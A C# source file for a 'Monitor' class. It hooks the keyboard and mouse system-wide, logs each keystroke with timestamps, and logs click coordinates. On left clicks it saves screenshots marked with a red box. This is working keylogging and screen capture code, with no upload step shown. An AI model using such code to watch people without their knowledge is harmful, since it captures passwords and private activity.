using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Monitor
{
    public class Operate
    {
        UserActivityHook _hook;
        public void Init()
        {
            Log.Write("Monitor.Init");
            _hook = new UserActivityHook();
            _hook.Start();
            _hook.KeyUp += hook_KeyUp;
            _hook.OverKeyUp += _hook_OverKeyUp;
            _hook.OnMouseLeft += _hook_OnMouseLeft;
            _hook.OnMouseLeftClick += _hook_OnMouseLeftClick;
            _hook.OnMouseRight += _hook_OnMouseRight;
            _hook.OnMouseRightClick += _hook_OnMouseRightClick;

        }



        void _hook_OnMouseRightClick(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标右双击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseRight(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标右单击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseLeftClick(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标左双击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseLeft(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标左单击【x:{0}:y{1}】", e.X, e.Y));
            var img = Img.Cut();
            using (Graphics g = Graphics.FromImage(img))
            {
                var x = e.X;
                var y = e.Y;
                g.DrawLine(new Pen(Color.Red, 3), x - 40, y - 15, x - 40, y + 15);//坐标
                g.DrawLine(new Pen(Color.Red, 3), x + 40, y - 15, x + 40, y + 15);//坐标

                g.DrawLine(new Pen(Color.Red, 3), x - 40, y - 15, x + 40, y - 15);//坐标
                g.DrawLine(new Pen(Color.Red, 3), x - 40, y + 15, x + 40, y + 15);//坐标
               
            }

            Log.WriteImg(img);
        }

        void _hook_OverKeyUp(object sender, MouseEventArgs e)
        {
            Log.Write("\r\n结束按键\r\n\r\n");
        }

        void hook_KeyUp(object sender, KeyEventArgs e)
        {
            if (_hook.IsFirstKeyUp)
            {
                Log.Write("\r\n键盘开始输入date:" + DateTime.Now.ToString("yyyy/MM/dd hh:mm:ss") + "\r\n");
            }

            Log.Write(((char)e.KeyCode) + "");
        }





    }
}
